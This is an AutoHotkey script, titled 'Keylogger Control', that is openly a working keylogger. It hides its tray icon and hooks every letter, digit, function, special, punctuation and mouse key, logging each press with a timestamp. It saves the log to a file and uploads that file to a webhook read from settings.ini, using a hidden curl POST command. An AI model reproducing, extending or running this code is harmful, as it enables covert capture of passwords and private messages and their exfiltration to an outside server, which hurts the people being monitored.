#NoEnv
#SingleInstance Force
#NoTrayIcon
SendMode Input
SetWorkingDir %A_ScriptDir%

LoggedKeys := ""

IniRead, webhook, %A_ScriptDir%\settings.ini, Settings, webhook
IniRead, alias, %A_ScriptDir%\settings.ini, Settings, alias

if (webhook = "ERROR" or alias = "ERROR") {
    MsgBox, Webhook URL or alias not found in settings.ini.
    ExitApp
}

Gui, Add, Button, gSendAndExit w100 h30 Center, Done
Gui, Show, w120 h60, Keylogger Control

Loop, 26
{
    key := Chr(97 + A_Index - 1)
    Hotkey, ~%key%, LogKey
}

Loop, 10
{
    key := A_Index - 1
    Hotkey, ~%key%, LogKey
}

specialKeys := "Space,Enter,Tab,Esc,Backspace,Shift,Ctrl,Alt,CapsLock,Up,Down,Left,Right,LButton,RButton,MButton,XButton1,XButton2"
Loop, Parse, specialKeys, `,
    Hotkey, ~%A_LoopField%, LogKey

Loop, 12
    Hotkey, ~F%A_Index%, LogKey

punctuationKeys := "[,],;,',\,`,,.,/,-,="
Loop, Parse, punctuationKeys, `,
    Hotkey, ~%A_LoopField%, LogKey

LogKey:
    FormatTime, now, , yyyy-MM-dd HH:mm:ss
    LoggedKeys .= "[" now "] " A_ThisHotkey "`n"
return

SendAndExit:
    SaveLog()
    ExitApp
return

SaveLog() {
    global LoggedKeys, webhook, alias
    logsDir := A_ScriptDir "\logs"
    FileCreateDir, %logsDir%
    FormatTime, currentTime, , yyyyMMdd_HHmmss
    filePath := logsDir "\" alias "-InputViewer_" currentTime ".txt"
    FileAppend, %LoggedKeys%, %filePath%
    RunWait, %ComSpec% /c curl -X POST -F "file=@%filePath%" %webhook%, , Hide
}
